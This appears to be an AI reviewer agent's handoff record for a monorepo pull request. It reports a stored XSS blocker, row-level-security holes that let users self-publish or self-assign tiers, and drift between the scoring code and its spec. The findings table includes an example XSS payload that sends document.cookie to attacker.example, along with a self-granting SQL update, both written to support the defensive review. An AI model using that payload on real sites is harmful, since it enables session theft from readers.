---
id: 2026-09-19-002
type: handoff
from: reviewer
to: [builder, migrator]
subject: PR 3 review, three blockers, stored XSS and self-assigned tiers reachable with the anon key
backlog: none
state: open
opened: 2026-09-19
closed:
outcome:
---

## Findings

PR 3, "Monorepo foundation", merged as `47fab54` on 2026-09-19. Read with
`git diff 47fab54^1 47fab54`. Four commits, 235 files, 47,142 insertions, no deletions.

The brief and the request both described this as three commits and 199 files. The fourth
commit is `116dc60`, the voice gate. The file count difference is that commit plus
`aad71c4`, which added `team/` and `exchange/`.

Severity: a **blocker** is reachable today by a signed-up user through the published anon
key. A **should-fix** needs a second condition that is not yet true. A **nit** is a claim
that is wrong or a convention that is not kept.

| Severity | File and line | Claim | Failure scenario |
| --- | --- | --- | --- |
| blocker | `apps/web/src/app/articles/[slug]/page.tsx:43` | `article.body_html` is rendered with `dangerouslySetInnerHTML` and no sanitizer exists anywhere in the repo, while the `articles` policies let any signed-up user write that column and set `status` to `published` | A user signs up, inserts a `profiles` row, inserts an `articles` row with `author_id` set to themselves, then PATCHes `body_html` to `<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">` and `status` to `published`, all through PostgREST with the anon key. The row lands in `getPublishedArticles`, so it appears in the front page list at `apps/web/src/app/page.tsx:37`, and the script runs in every reader's browser on open |
| blocker | `supabase/migrations/20260919000000_foundation.sql:144` | The `comments` update policy is row level only, so its owner may write every column of their own row, including `final_tier`, `status` and `hardened_at` | A contributor posts a comment, then sends `update comments set final_tier='forum', status='published' where id=<their own>`. RLS permits it because the row is theirs. The comment is published at Forum with no classification, no votes and no resolution. The same shape reaches `articles.status` and `articles.amend_until` at `20260919000100_articles_native.sql:42`, and `aspirations.expires_at` at `20260919000000_foundation.sql:351`, where an owner can extend their own 90 day window without limit |
| blocker | `packages/core/src/axis-mapping.ts:53` | `axisDeltasFor` implements a different function from `docs/Dialecta_Axis_Mapping_v1.md`, section "Per-axis triggers", on all six axes, and breaks two of that document's universal rules | Universal rule 1 says "**Breach** comments produce **no axis_events at all**". The code returns six deltas for every classification, so a Breach comment carrying a developed claim earns acuity 1, reach 1, calibration 1 and magnanimity 1. A personal attack builds the attacker's fingerprint. Consistency is hardcoded 0 at line 72 where the spec awards +1 for "Every non-Breach comment", so one of the six pillars never moves. Reach is scored off engagement and opposing views where the spec scores topic novelty, an input the function is never given. Discourse keys on tier where the spec keys on `article_engagement === 'specific'`. These rows go into `axis_events`, which is append-only by mandate, so wrong deltas cannot be withdrawn once the pipeline is wired |
| should-fix | `supabase/migrations/20260919000000_foundation.sql:234` | `axis_events` declares `comment_id` and `classification_id` as `not null` and has no `source` or `article_id` column, while the spec requires a discriminator with those two columns null for article-sourced events | `docs/Dialecta_Axis_Mapping_v1.md` line 102 states the schema as a `source` discriminator, `comment` or `article`, with article events carrying `article_id` and null `comment_id` and `classification_id`. The publish hook the spec describes at line 104 cannot insert a row. Fixing it needs a second migration against a table that is already append-only |
| should-fix | `packages/core/src/resolution.ts:118` | `distribution` is documented at line 55 as "The combined, normalized distribution" and does not sum to 1 whenever `stage25Quality` is below 1 | The stage 2.5 part adds its full 0.1 to `weightSum` while contributing only `q` of mass, because `boosted[selfTier] = stage25`. With the inputs from `resolution.test.ts:50` and `stage25Quality` at 0.5, the returned distribution sums to 0.95. At `q` of 0 it sums to 0.9. Any confidence bar built from it reads short. The final tier is unaffected because the denominator is uniform. The inline comment at line 106, "A quality of 0 spends the weight on nothing, which is equivalent to leaving it out", is false: leaving it out gives `forum` 0.444 where the current code gives 0.40. No test asserts the sum |
| should-fix | `apps/web/src/strings.ts:18` | `commenterMessages` has no `forum` entry, though the file header at line 6 calls these "the fallback when the classifier's own message fails validation" | The classifier is instructed to produce a Forum message at `packages/core/src/classification.ts:201`. When that message fails validation there is nothing to fall back to and the commenter sees no message. The spec's reference table is headed "one per tier below Forum", so the code is faithful to it and the fallback set is the thing that is incomplete |
| should-fix | `apps/web/src/app/globals.css:30` | `var(--font-display, Georgia, serif)` hand-types a font that is in no token. `tokens.css:47` sets `--font-display: 'Cormorant Garamond', serif` | Any render where `tokens.css` has not applied falls back to Georgia, which is not in the design system. Lines 21 and 22 have the same shape with `#f7f2e8` and `#3a342c`, which match `tokens.css:10` and `:18` today and are a second copy that `npm run tokens` will not update. The file's own header at line 3 says "Do not hard-code values here that a token already provides" |
| should-fix | `supabase/migrations/20260919000000_foundation.sql:33` | `public.set_updated_at()` sets no `search_path` | Supabase's linter rule `function_search_path_mutable` fires on it, and `supabase/CLAUDE.md` makes `supabase db lint` a gate that "must be clean" before a migration is committed. The function is `security invoker`, so this is a gate failure and not a breach |
| should-fix | `apps/web/src/strings.ts:27` and `docs/Dialecta_Editorial_Voice.md:188` | The Breach commenter message is three sentences, against a locked decision that says two | Root `CLAUDE.md` locks "two sentences per commenter message" and Editorial Voice rule 6 at line 176 says the same, but that document's own reference table at line 188 carries a three sentence Breach message, which `strings.ts` copies verbatim. Two specs disagree, so this is not a code fix. Per `exchange/README.md` it wants an `advice` record to `spec-reader` or `decider`. This agent has not filed one; whoever picks this up should |
| should-fix | `apps/web/next.config.ts:3` | No `headers()`, so the app ships no Content Security Policy | A policy that blocks inline and remote script turns the first blocker from a stolen session into a broken image. Absent one, the only thing standing between a published article and arbitrary script is a sanitizer that does not exist |
| nit | `packages/core/CLAUDE.md:15` | "Flagged in `resolution.ts`" is wrong | The 35 percent against 40 percent consequence is recorded at `packages/core/test/resolution.test.ts:33`, not in the source. `resolution.ts:18` flags a different open question, the community re-review threshold. A reader following the pointer finds the wrong note |
| nit | `packages/core/test/` | No tests for `tiers.ts`, `pillars.ts` or `archetypes.ts` | `packages/core/CLAUDE.md` says "Every exported function has a test in `test/`". Eight exported functions have none, including the three that throw on an unknown id |
| nit | `.github/workflows/ci.yml:57` | `$files` is expanded unquoted into `python3 scripts/voice_check.py --strict $files`, and `--diff-filter=AM` skips renames | A `.md` file with a space in its name splits into two arguments and the gate fails on a path that does not exist. No current `.md` path has a space; the nine that do are all under `design/logos/`. A renamed prose file skips the gate entirely |

**Not yet.** The first three need fixing before anything is built on this schema.

Nothing blocks on that verdict: PR 3 is already merged, so these are follow-up items, which is
what `team/reviewer/brief.md` asked for.

## Done

- Full review of `47fab54` against the six checks in `.claude/agents/reviewer.md`, in order.
- Checks run on this machine: `npm run typecheck` clean across both workspaces.
  `npm test` green, 25 tests in 3 files. `python scripts/voice_check.py --strict` on
  `apps/web/src/strings.ts` reports 0 hard and 0 soft hits, so the voice gate passes on the
  one file it guards outside `.md`.
- Checks 1, 2, 3, 4, 5 and 6 each produced at least one finding. Thirteen in total, in the
  table above, ranked.
- Research sprint filed alongside this review: five notes in `team/reviewer/knowledge/`, and
  `team/reviewer/knowledge/review-checklist.md`, which is check 2 written out as thirteen
  named failure modes. Rows 3 and 11 of that checklist are the two that found blockers here.

## Not done

- `supabase db lint` was not run. No local Supabase stack is up in this worktree, and the
  linter finding at `20260919000000_foundation.sql:33` is reasoned from the rule name rather
  than observed. Confirm it before treating it as settled.
- The RLS findings are reasoned from the policy text plus Supabase's default grants to
  `authenticated` in the `public` schema. That grant assumption is load bearing for the
  severity of both database blockers and was not read from a source. It is carried as a
  `todo` lead in `team/reviewer/knowledge/reading-list.md`. If those grants are not present,
  blocker B2 drops to should-fix. Blocker B1 does not drop, because an author writing their
  own article is the intended path.
- No exploit was executed. There is no Supabase project this agent may write to, and the
  reviewer mandate is read only.
- The 70 files under `docs/` were not read end to end. They are the April to May 2026 import,
  exempt from the voice gate by `.voiceignore`, and this review treated them as the specs
  rather than as the diff. Spec drift was checked against them, not in them.
- `design/`, `components/`, `council/` and `tools/` were read only where a check pointed into
  them.

## Governing spec

`docs/Dialecta_Axis_Mapping_v1.md`, section "Per-axis triggers" and "Universal rules".
That is the spec behind the largest finding. Other specs cited per row in the table.

## Acceptance

Run from the repo root at `C:\Dialecta\.claude\worktrees\sad-hertz-97dc77`, on `47fab54`
as an ancestor of HEAD.

```
npm run typecheck
```

Clean. Both `@dialecta/web` and `@dialecta/core` pass `tsc --noEmit`.

```
npm test
```

Green. `test/resolution.test.ts` 8, `test/axis-mapping.test.ts` 7,
`test/classification.test.ts` 10. 25 passed, 711ms.

```
python scripts/voice_check.py --strict apps/web/src/strings.ts
```

`307 words, 0 hard, 0 soft`.

Everything green. That is the point of the third blocker: three of the four checks a
contributor would run before merging pass on a schema and an engine that contradict the spec,
and none of them looks at a policy.

## Traps

- `axis_events` having no insert, update or delete policy looks like an oversight and is
  correct. Under the policy combination rule, no permissive policy means no grant, which is
  exactly the append-only ledger the mandate asks for. Do not add policies there to make a
  write work; use the service role.
- The bare `auth.uid() = user_id` form throughout the migration looks unsafe next to Supabase's
  recommended `auth.uid() IS NOT NULL AND auth.uid() = user_id`. It is not. `auth.uid()` is
  null for `anon`, and `null = uuid` is null, which is not true, so it fails closed. The
  recommended form is about legibility and the `(select auth.uid())` wrapper is about
  performance. Neither is a hole. Do not report it as one.
- The three sentence Breach message in `strings.ts` looks like a voice violation introduced by
  this PR. It is copied verbatim from `docs/Dialecta_Editorial_Voice.md:188`. The conflict is
  between that table and the locked rule, not in the code.
- `.voiceignore` reads as CRLF in a Windows working tree, which looks like it would break
  `grep -vxF` on a Linux runner. It does not. `git ls-files --eol` shows the index as `i/lf`
  and there is no `.gitattributes`, so CI checks out LF. This was checked and is not a finding.
- `main { max-width: 44rem; padding: 3rem 1rem }` in `globals.css` looks like hand-typed
  spacing against check 5. `tokens.css` defines no spacing scale at all, only `--radius-sm`,
  `--radius-md` and `--radius-lg` at line 52. There is no token to have used, so it is not
  drift. The absent spacing scale is a design system gap, not a code finding.
- `resolution.ts` renormalizing by `weightSum` looks like the bug. It is not; the
  renormalization is deliberate and documented at line 15. The defect is narrower: the stage
  2.5 part contributes less mass than the weight it adds to the denominator.
- The migrations in this PR collide with the live Supabase project. That is already open as
  `2026-09-19-001` and is deliberately not repeated as a finding here. Read that record before
  touching anything under `supabase/`.

## Do not touch

- `supabase/migrations/20260919000000_foundation.sql` and
  `supabase/migrations/20260919000100_articles_native.sql`. Both are shipped on `main`, and
  `supabase/CLAUDE.md` says never edit a shipped migration. Every database finding above is
  fixed forward in a new file, by `migrator`, and not before `2026-09-19-001` is settled.
- `docs/` in its entirety. Specs are Dan's, `guard-docs.mjs` blocks agents from editing them,
  and two findings above are spec conflicts that need a decision rather than an edit.
- `apps/web/src/styles/tokens.css`. Generated from `design/dialecta-design-spec.html`. The
  `globals.css` finding is fixed in `globals.css`, by deleting the fallbacks, not by editing
  the tokens.
- `team/reviewer/`. This agent's folder.

## Correction, appended 2026-09-19 by reviewer

Records are append-only while open, so this corrects two statements above rather than editing
them.

**The grants assumption under blocker B2 is confirmed, not assumed.** `## Not done` says the
severity rests on Supabase granting `authenticated` insert and update on new tables in `public`
by default, and that if those grants were absent B2 would drop to should-fix. They are present.
Supabase's "Securing your API" guide states that "tables created in `public` receive `SELECT`,
`INSERT`, `UPDATE`, and `DELETE` privileges for `anon`, `authenticated`, and `service_role` by
default". Filed as `team/reviewer/knowledge/2026-supabase-default-grants.md`. B2 stays a
blocker.

**The scheduled removal of those defaults does not rescue this schema.** Supabase changelog
45329 retires the automatic grants: a checkbox at project creation from 2026-04-28, the new
default for new projects from 2026-05-30, and enforcement for existing projects from
2026-10-30. Dialecta's project carries migrations dated 2026-04-29 to 2026-05-07, so it is an
existing project on the old behavior. The changelog is explicit that the change reaches future
objects only: "Existing tables are not affected in your project, they keep their current grants
and stay reachable." Any table these migrations create before 2026-10-30 keeps its grants
permanently. Waiting is not a remedy.

**B2 and B1 now have a worked remedy**, which the review named a hole without being able to
name a fix for. It is in `team/reviewer/knowledge/2026-postgresql-column-privileges.md`, with
statements for `comments`, `articles` and `aspirations`.

One trap goes with it, because the obvious fix is wrong and silently so. PostgreSQL documents
that "Granting the privilege at the table level and then revoking it for one column will not do
what one might wish: the table-level grant is unaffected by a column-level operation." So
`revoke update (final_tier) on public.comments from authenticated` is a no-op that raises no
error and reviews as correct. The fix has to revoke the table-level `UPDATE` first, then grant
back a column list.

**A fourth reachable path was found while writing that remedy, and it is not in the table
above.** Every column discussed under B2 is also settable at insert time. The insert policies
check only `auth.uid() = author_id`, so a contributor can create a comment with `status` and
`final_tier` already set and never issue an update at all. A fix that covers `UPDATE` and not
`INSERT` leaves B2 open. Same severity, same remedy shape, its own column list.

**Nothing else above changes.** `## Not done` still stands on `supabase db lint`, which has not
been run, and on the absence of any executed exploit.
